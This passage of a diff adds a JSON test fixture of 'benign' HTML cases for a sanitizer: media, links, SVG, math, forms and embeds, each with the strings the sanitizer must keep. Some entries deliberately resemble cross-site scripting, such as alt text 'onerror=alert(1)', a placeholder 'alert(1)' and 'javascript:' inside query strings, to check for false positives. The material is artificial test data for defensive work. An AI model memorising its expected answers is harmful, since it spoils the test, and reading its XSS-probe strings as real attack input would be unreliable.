+   "alt=\"onerror=alert(1)\""
+  ],
+  "note": "attribute value is text, not executable"
+ },
+ {
+  "id": "B37",
+  "label": "benign",
+  "category": "media",
+  "html": "<video controls src=\"https://example.com/v.mp4\" poster=\"https://example.com/p.jpg\"></video>",
+  "exec": "none",
+  "keep": [
+   "v.mp4",
+   "poster="
+  ],
+  "note": ""
+ },
+ {
+  "id": "B38",
+  "label": "benign",
+  "category": "media",
+  "html": "<audio controls src=\"https://example.com/a.mp3\"></audio>",
+  "exec": "none",
+  "keep": [
+   "a.mp3"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B39",
+  "label": "benign",
+  "category": "media",
+  "html": "<picture><source srcset=\"https://example.com/a.webp\" type=\"image/webp\"><img src=\"https://example.com/a.jpg\" alt=\"scene\"></picture>",
+  "exec": "none",
+  "keep": [
+   "a.webp",
+   "a.jpg"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B40",
+  "label": "benign",
+  "category": "media",
+  "html": "<img src=\"https://example.com/a.jpg\" srcset=\"https://example.com/a@2x.jpg 2x\" loading=\"lazy\" alt=\"\">",
+  "exec": "none",
+  "keep": [
+   "a@2x.jpg"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B41",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"mailto:someone@example.com\">email us</a>",
+  "exec": "none",
+  "keep": [
+   "mailto:someone@example.com"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B42",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"tel:+15555550100\">call us</a>",
+  "exec": "none",
+  "keep": [
+   "tel:+15555550100"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B43",
+  "label": "benign",
+  "category": "link",
+  "html": "<p>A claim.<sup><a href=\"#fn:1\" id=\"fnref:1\">1</a></sup></p>",
+  "exec": "none",
+  "keep": [
+   "href=\"#fn:1\""
+  ],
+  "note": ""
+ },
+ {
+  "id": "B44",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"/relative/path\">relative</a>",
+  "exec": "none",
+  "keep": [
+   "/relative/path"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B45",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"https://example.com/search?q=javascript:tutorial\">search results</a>",
+  "exec": "none",
+  "keep": [
+   "q=javascript:tutorial"
+  ],
+  "note": "javascript: inside query string, not the scheme"
+ },
+ {
+  "id": "B46",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"https://example.com/docs#javascript:\">fragment</a>",
+  "exec": "none",
+  "keep": [
+   "#javascript:"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B47",
+  "label": "benign",
+  "category": "svg",
+  "html": "<svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" aria-hidden=\"true\"><path d=\"M12 2L2 7l10 5 10-5-10-5z\"/></svg>",
+  "exec": "none",
+  "keep": [
+   "<path d=\"M12 2L2 7l10 5 10-5-10-5z\""
+  ],
+  "note": ""
+ },
+ {
+  "id": "B48",
+  "label": "benign",
+  "category": "svg",
+  "html": "<svg viewBox=\"0 0 100 100\"><circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"red\"/></svg>",
+  "exec": "none",
+  "keep": [
+   "<circle"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B49",
+  "label": "benign",
+  "category": "svg",
+  "html": "<svg><use href=\"#icon-check\"/></svg>",
+  "exec": "none",
+  "keep": [
+   "href=\"#icon-check\""
+  ],
+  "note": ""
+ },
+ {
+  "id": "B50",
+  "label": "benign",
+  "category": "math",
+  "html": "<math><mrow><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>y</mi></mrow></math>",
+  "exec": "none",
+  "keep": [
+   "<msup>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B51",
+  "label": "benign",
+  "category": "math",
+  "html": "<math display=\"block\"><mfrac><mi>a</mi><mi>b</mi></mfrac></math>",
+  "exec": "none",
+  "keep": [
+   "<mfrac>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B52",
+  "label": "benign",
+  "category": "math",
+  "html": "<p>Pythagoras:</p><script type=\"math/tex\">x^2 + y^2 = z^2</script>",
+  "exec": "none",
+  "keep": [
+   "type=\"math/tex\"",
+   "x^2 + y^2 = z^2"
+  ],
+  "note": "math script is kept by design"
+ },
+ {
+  "id": "B53",
+  "label": "benign",
+  "category": "misc",
+  "html": "<details><summary>More info</summary><p>Hidden until opened.</p></details>",
+  "exec": "none",
+  "keep": [
+   "<summary>More info</summary>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B54",
+  "label": "benign",
+  "category": "form",
+  "html": "<form method=\"post\" action=\"/search\"><input type=\"text\" name=\"q\" placeholder=\"Search\"><button type=\"submit\">Go</button></form>",
+  "exec": "none",
+  "keep": [
+   "action=\"/search\""
+  ],
+  "note": ""
+ },
+ {
+  "id": "B55",
+  "label": "benign",
+  "category": "misc",
+  "html": "<p style=\"color:red\">Red text</p>",
+  "exec": "none",
+  "keep": [
+   "Red text"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B56",
+  "label": "benign",
+  "category": "misc",
+  "html": "<div class=\"advertisement\"><p>Subscribe to our newsletter for weekly updates.</p></div>",
+  "exec": "none",
+  "keep": [
+   "Subscribe to our newsletter"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B57",
+  "label": "benign",
+  "category": "misc",
+  "html": "<template><p>Plain text template</p></template><p>Visible text.</p>",
+  "exec": "none",
+  "keep": [
+   "Visible text."
+  ],
+  "note": "template is removed by policy; visible text must stay"
+ },
+ {
+  "id": "B58",
+  "label": "benign",
+  "category": "misc",
+  "html": "<button type=\"button\">Click me</button>",
+  "exec": "none",
+  "keep": [
+   "Click me"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B59",
+  "label": "benign",
+  "category": "misc",
+  "html": "<p><input type=\"checkbox\" checked disabled> Done</p>",
+  "exec": "none",
+  "keep": [
+   "checked"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B60",
+  "label": "benign",
+  "category": "misc",
+  "html": "<div data-onerror=\"log\" data-src=\"https://example.com/lazy.jpg\">lazy block</div>",
+  "exec": "none",
+  "keep": [
+   "lazy block"
+  ],
+  "note": "data- attribute named like a handler"
+ },
+ {
+  "id": "B61",
+  "label": "benign",
+  "category": "misc",
+  "html": "<span title=\"Learn about the onload event\">tooltip</span>",
+  "exec": "none",
+  "keep": [
+   "tooltip"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B62",
+  "label": "benign",
+  "category": "misc",
+  "html": "<a href=\"https://example.com/docs/onclick\">onclick docs</a>",
+  "exec": "none",
+  "keep": [
+   "docs/onclick"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B63",
+  "label": "benign",
+  "category": "misc",
+  "html": "<p>Tags: javascript: the good parts, parsing, HTML</p>",
+  "exec": "none",
+  "keep": [
+   "javascript: the good parts"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B64",
+  "label": "benign",
+  "category": "misc",
+  "html": "<p>Press <kbd>Ctrl</kbd>+<kbd>C</kbd> to copy <abbr title=\"HyperText Markup Language\">HTML</abbr>.</p>",
+  "exec": "none",
+  "keep": [
+   "<kbd>Ctrl</kbd>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B65",
+  "label": "benign",
+  "category": "form",
+  "html": "<label for=\"name\">Name</label><input id=\"name\" type=\"text\" placeholder=\"alert(1)\">",
+  "exec": "none",
+  "keep": [
+   "placeholder=\"alert(1)\""
+  ],
+  "note": ""
+ },
+ {
+  "id": "B66",
+  "label": "benign",
+  "category": "embed",
+  "html": "<iframe src=\"https://www.google.com/maps/embed?pb=!1m18\" loading=\"lazy\" referrerpolicy=\"no-referrer-when-downgrade\"></iframe>",
+  "exec": "none",
+  "keep": [
+   "google.com/maps/embed"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B67",
+  "label": "benign",
+  "category": "article",
+  "html": "<p>Citation needed.<sup class=\"reference\"><a href=\"#cite_note-1\">[1]</a></sup></p>",
+  "exec": "none",
+  "keep": [
+   "#cite_note-1"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B68",
+  "label": "benign",
+  "category": "article",
+  "html": "<p><del>old price</del> <ins>new price</ins> <mark>highlighted</mark></p>",
+  "exec": "none",
+  "keep": [
+   "<mark>highlighted</mark>"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B69",
+  "label": "benign",
+  "category": "article",
+  "html": "<pre>  ___\n /   \\\n| o o |\n \\___/</pre>",
+  "exec": "none",
+  "keep": [
+   "| o o |"
+  ],
+  "note": ""
+ },
+ {
+  "id": "B70",
+  "label": "benign",
+  "category": "embed",
+  "html": "<blockquote class=\"twitter-tweet\"><p>Shipping today.</p>&mdash; Example User (@example) <a href=\"https://twitter.com/example/status/1\">January 1, 2024</a></blockquote>",
+  "exec": "none",
+  "keep": [
+   "Shipping today."
+  ],
+  "note": ""
+ },
+ {
+  "id": "B71",
+  "label": "benign",
+  "category": "misc",
+  "html": "<div><!-- TODO: remove <script> from legacy pages --><p>Body text.</p></div>",
+  "exec": "none",
+  "keep": [
+   "Body text."
+  ],
+  "note": "comment text is not executable"
+ },
+ {
+  "id": "B72",
+  "label": "benign",
+  "category": "link",
+  "html": "<a href=\"https://example.com\" target=\"_blank\" rel=\"noopener\">external link</a>",
+  "exec": "none",
+  "keep": [
+   "rel=\"noopener\""
+  ],
+  "note": ""
+ }
+]
